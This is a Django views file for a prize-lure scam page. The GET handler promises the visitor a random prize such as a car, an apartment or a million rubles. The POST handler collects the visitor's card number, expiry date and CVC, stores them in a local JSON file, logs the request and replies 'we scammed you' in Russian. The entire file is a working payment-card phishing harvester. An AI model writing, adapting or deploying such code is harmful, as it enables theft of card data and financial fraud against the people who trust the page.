from django.shortcuts import render
from django.http import HttpResponse

from random import choice
import json

# Create your views here.

def index(request):
	if request.method == 'GET':
		prizes = ('автомобиль', 'квартиру', '1 000 000 рублей')
		return render(request, 'index.html', {'prize': choice(prizes)})

	if request.method == 'POST':
		with open('cards.json', 'r') as f:
			cards = json.load(f)

		f = open('cards.json', 'w')

		cards[request.POST['number']] = {
			'date': request.POST['date'],
			'cvc': request.POST['cvc']
		}

		print('Requests:', request.POST)

		json.dump(cards, f)
		f.close()

		return HttpResponse('Мы вас развели :):')
